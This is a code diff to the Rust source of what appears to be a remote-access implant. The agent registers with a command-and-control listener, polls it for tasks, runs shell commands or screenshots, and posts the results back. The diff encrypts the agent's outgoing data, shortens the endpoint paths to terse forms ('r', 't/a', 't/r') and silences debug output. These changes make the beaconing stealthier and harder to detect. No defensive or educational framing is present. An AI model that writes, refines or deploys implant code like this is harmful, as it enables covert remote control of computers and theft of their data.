@@ -6,13 +6,13 @@ use std::{
 };
 
 use crate::{
-    core::agents::AgentData,
+    core::agents::{AgentData, enc_agentdata},
     Config,
     core::tasks::{
         linux::shell::shell,
         screenshot::screenshot
     },
-    crypto::aesgcm::{encrypt, decrypt, encode, decode},
+    crypto::aesgcm::{decode_decrypt, encrypt_encode},
     utils::random::random_name, config::listener,
 };
 
@@ -45,7 +45,7 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
         config.key.to_string(),
         config.nonce.to_string(),
     );
-    // let ra_json = serde_json::to_string(&ra).unwrap();
+    let ra_enc = enc_agentdata(ra.clone());
 
     // Initialize client
     let mut client = reqwest::Client::new();
@@ -57,21 +57,25 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
     
         // Register agent
         let response = match client
-            .post(format!("{}{}", listener_url.to_string(), "reg"))
-            .json(&ra)
+            .post(format!("{}{}", listener_url.to_string(), "r"))
+            .json(&ra_enc)
             .send()
             .await
         {
             Ok(resp) => {
                 registered = true;
                 let resp = resp.text().await.unwrap();
-                let decoded = decode(resp.as_bytes());
-                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
-                String::from_utf8(decrypted).unwrap()
+              
+                String::from_utf8(
+                    decode_decrypt(
+                        resp.as_bytes(),
+                        config.key.as_bytes(),
+                        config.nonce.as_bytes()
+                    )).unwrap()
             },
             Err(_) => continue,
         };
-        println!("{}", response);
+        // println!("{}", response);
     }
 
     loop {
@@ -81,24 +85,28 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
 
         // Get task
         let task = match client
-            .post(format!("{}{}", listener_url.to_string(), "task/ask"))
-            .json(&ra)
+            .post(format!("{}{}", listener_url.to_string(), "t/a"))
+            .json(&ra_enc)
             .send()
             .await
         {
             Ok(resp) => {
                 let resp = resp.text().await.unwrap();
-                let decoded = decode(resp.as_bytes());
-                let decrypted = decrypt(&decoded, config.key.as_bytes(), config.nonce.as_bytes()).unwrap();
-                String::from_utf8(decrypted).unwrap()
+
+                String::from_utf8(
+                    decode_decrypt(
+                        resp.as_bytes(),
+                        config.key.as_bytes(),
+                        config.nonce.as_bytes()
+                    )).unwrap()
             },
             Err(e) => {
-                println!("Error fetching /task/ask: {:?}", e);
+                // println!("Error fetching /t/a: {:?}", e);
                 continue;
             }
         };
 
-        println!("Task: {task}");
+        // println!("Task: {task}");
 
         // Execute task
         let task_args = match shellwords::split(&task) {
@@ -120,9 +128,10 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
                         ra.task_result = Some(e.to_string().as_bytes().to_vec());
                     }
                 }
+                let ra_enc = enc_agentdata(ra.clone());
                 client
-                    .post(format!("{}{}", listener_url.to_string(), "task/result"))
-                    .json(&ra)
+                    .post(format!("{}{}", listener_url.to_string(), "t/r"))
+                    .json(&ra_enc)
                     .send()
                     .await;
             }
@@ -135,9 +144,10 @@ pub async fn run(config: Config) -> Result<(), std::io::Error> {
                         ra.task_result = Some(e.to_string().as_bytes().to_vec());
                     }
                 }
+                let ra_enc = enc_agentdata(ra.clone());
                 client
-                    .post(format!("{}{}", listener_url.to_string(), "task/result"))
-                    .json(&ra)
+                    .post(format!("{}{}", listener_url.to_string(), "t/r"))
+                    .json(&ra_enc)
                     .send()
                     .await;
             }
